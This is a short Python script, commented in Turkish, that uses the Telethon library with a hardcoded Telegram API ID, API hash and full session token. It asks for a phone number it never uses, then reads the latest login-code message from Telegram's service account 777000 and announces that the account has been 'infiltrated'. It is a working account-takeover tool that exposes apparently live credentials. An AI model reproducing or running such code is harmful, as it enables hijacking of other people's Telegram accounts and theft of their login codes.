from telethon.sync import TelegramClient, events
from telethon.sessions import StringSession

import time

# Bu senin asistan hesabının string session'ı (önceden alınmış olmalı)


from telethon.sync import TelegramClient
from telethon.sessions import StringSession

# Gerekli bilgiler
api_id = 25512251  # my.telegram.org'dan al
api_hash = "86cf5ff56e56c4f20a7b1295b130e720"

string_session = "1BJWap1sBu4YTV1DpDYtY0IT-HEEYjtHAPEC-6xl--qFbmqB3LMADRsWsZ3KqWzHt_v-9KnDnlXfHl_C7l_vSFfhWABWqAszQ9g1qVQqj37TxgUgtcR9P_lhLn80dJJLAREIeop1dRTqFjcqdzZhX7e7XD9rGUx1XX6_XAnot53qYNXjdgSayhsxPZ7NyI2iwEoAhWk66qN0qV6WBP2_LzOV8uJeSyVmsLdDcYOrQ5hFa0XGqHumyuouQT543GmnRjoOTth0Bfj1-mdIRY3fcb13iz7uQsbdzBRnX8uKe6LlYoCvwV-e9hCAsW5LBuVYEXpeRmtff3Kbp6gfYCwL2fD8hKAU6jt4="

input("📱 Telefon numaranızı girin (opsiyonel): ")

# Telegram istemcisi başlat
with TelegramClient(StringSession(string_session), api_id, api_hash) as client:
    # 777000 Telegram sistem hesabından gelen son mesajı al
    messages = client.get_messages(777000, limit=1)

    if messages:
        print("\n📨 Mükemmel hesaba sızıldı işte giriş yapman için gereken kod:")
        print("────────────────────────────")
        print(messages[0].text)
        print("────────────────────────────")
    else:
        print("❌ 777000'dan hiç mesaj alınamadı.")
